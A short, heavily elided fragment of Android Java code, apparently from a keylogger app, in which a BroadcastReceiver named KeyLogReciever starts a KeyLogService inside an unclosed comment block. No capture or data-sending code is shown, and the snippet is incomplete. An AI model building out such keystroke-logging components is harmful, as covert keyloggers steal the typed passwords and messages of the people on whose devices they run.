...
import rapidora.co.myapplication.services.KeyLogService;
...
public class KeyLogReciever extends BroadcastReceiver {
    ...
    public void onReceive(Context context, Intent intent) {
        ...
        try {
         ...
         /*   Intent serviceIntent = new Intent(context, KeyLogService.class);
            Intent receiverIntent = new Intent(context, KeyLogReciever.class);
            ...
            Log.e("keylog", "Recioever");
           context. startService(new Intent(context, KeyLogService.class));
